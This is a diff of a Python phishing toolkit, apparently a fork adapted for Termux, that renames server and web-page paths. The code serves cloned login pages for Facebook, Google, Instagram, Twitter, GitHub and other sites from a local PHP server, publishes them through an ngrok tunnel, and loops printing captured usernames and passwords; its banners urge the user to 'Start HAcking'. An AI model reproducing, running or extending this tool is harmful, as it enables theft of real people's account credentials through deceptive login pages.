@@ -33,7 +33,7 @@ if connected() == False:
      exit(0)
 
 def checkNgrok():
-    if path.isfile('Server/ngrok') == False: 
+    if path.isfile('ServerTermux/ngrok') == False: 
         print '[*] Downloading Ngrok...'
         if architecture()[0] == '64bit':
             filename = 'ngrok-stable-linux-arm.zip'
@@ -42,7 +42,7 @@ def checkNgrok():
         url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
         download(url)
         system('unzip ' + filename)
-        system('mv ngrok Server/ngrok')
+        system('mv ngrok ServerTermux/ngrok')
         system('rm -Rf ' + filename)
         system('clear')
 checkNgrok()
@@ -59,7 +59,7 @@ def end():
                           {1}F I S H{2}                ~--___--~
  {0}This script was made by UndeadSec_ But I have added some more features in it ]
 {1}[ {0} Some more phising pages have been added in script. For a better Attack]
-[ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(RED, END, CYAN)
+[ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(GREEN, END, CYAN)
 
 def loadModule(module):
        print '''{0}
@@ -72,33 +72,33 @@ def loadModule(module):
  [{1}*{0}]{1} %s module loaded.{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
-    system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt')
+    system('rm -Rf ServerTermux/www/*.* && touch ServerTermux/www/usernames.txt')
     if option2 == '1' and social == 'Facebook':
-        system('cp WebPages/fb_standard/*.* Server/www/')
+        system('cp WebPagesTermux/fb_standard/*.* ServerTermux/www/')
     if option2 == '2' and social == 'Facebook':
-        system('cp WebPages/fb_advanced_poll/*.* Server/www/')  
+        system('cp WebPagesTermux/fb_advanced_poll/*.* ServerTermux/www/')  
     if option2 == '3' and social == 'Facebook':
-        system('cp WebPages/mobile_fb/*.* Server/www/')   
+        system('cp WebPagesTermux/mobile_fb/*.* ServerTermux/www/')   
     if option2 == '4' and social == 'Facebook':
-        system('cp WebPages/fb_security_fake/*.* Server/www/')  
+        system('cp WebPagesTermux/fb_security_fake/*.* ServerTermux/www/')  
     if option2 == '5' and social == 'Facebook':
-        system('cp WebPages/fb_messenger/*.* Server/www/')         
+        system('cp WebPagesTermux/fb_messenger/*.* ServerTermux/www/')         
     elif option2 == '1' and social == 'Google':
-        system('cp WebPages/google_standard/*.* Server/www/')
+        system('cp WebPagesTermux/google_standard/*.* ServerTermux/www/')
     elif option2 == '2' and social == 'Google':
-        system('cp WebPages/google_advanced_poll/*.* Server/www/')   
+        system('cp WebPagesTermux/google_advanced_poll/*.* ServerTermux/www/')   
     elif social == 'LinkedIn':
-        system('cp WebPages/linkedin/*.* Server/www/')
+        system('cp WebPagesTermux/linkedin/*.* ServerTermux/www/')
     elif social == 'GitHub':
-        system('cp WebPages/GitHub/*.* Server/www/')
+        system('cp WebPagesTermux/GitHub/*.* ServerTermux/www/')
     elif social == 'StackOverflow':
-        system('cp WebPages/stackoverflow/*.* Server/www/')
+        system('cp WebPagesTermux/stackoverflow/*.* ServerTermux/www/')
     elif social == 'WordPress':
-        system('cp WebPages/wordpress/*.* Server/www/')
+        system('cp WebPagesTermux/wordpress/*.* ServerTermux/www/')
     elif social == 'Twitter':
-        system('cp WebPages/twitter/*.* Server/www/')
+        system('cp WebPagesTermux/twitter/*.* ServerTermux/www/')
     elif option2 == '1' and social == 'Instagram':
-        system('cp WebPages/Instagram_web/*.* Server/www/')
+        system('cp WebPagesTermux/Instagram_web/*.* ServerTermux/www/')
 
 def waitCreds():
     print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
@@ -114,11 +114,11 @@ def waitCreds():
  [{1}*{0}]{1} And make your ngrok link more trusted type.{0}'''.format(CYAN, END)
     print " {0}[{1}*{0}]{1} Waiting for credentials... \n".format(GREEN, END)
     while True:
-        with open('Server/www/usernames.txt') as creds:
+        with open('ServerTermux/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(RED, END) % lines
-            system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
+            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
+            system('rm -rf ServerTermux/www/usernames.txt && touch ServerTermux/www/usernames.txt')
         creds.close()
 
 def runPEnv():
@@ -196,21 +196,21 @@ def runPEnv():
         exit(0)
 
 def runNgrok():
-    system('./Server/ngrok http 8080 > /dev/null &')
+    system('./ServerTermux/ngrok http 8080 > /dev/null &')
     sleep(10)
-    system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
-    url = open('ngrok.url', 'r')
+    system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrokTermux.url')
+    url = open('ngrokTermux.url', 'r')
     print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, END, GREEN)
     url.close()
 
-def runServer():
-    system("cd Server/www/ && php -S 127.0.0.1:8080")
+def runServerTermux():
+    system("cd ServerTermux/www/ && php -S 127.0.0.1:8080")
 
 if __name__ == "__main__":
     try:
         runPEnv()
         runNgrok()
-        multiprocessing.Process(target=runServer).start()
+        multiprocessing.Process(target=runServerTermux).start()
         waitCreds()
     except KeyboardInterrupt:
         system('pkill -f ngrok')
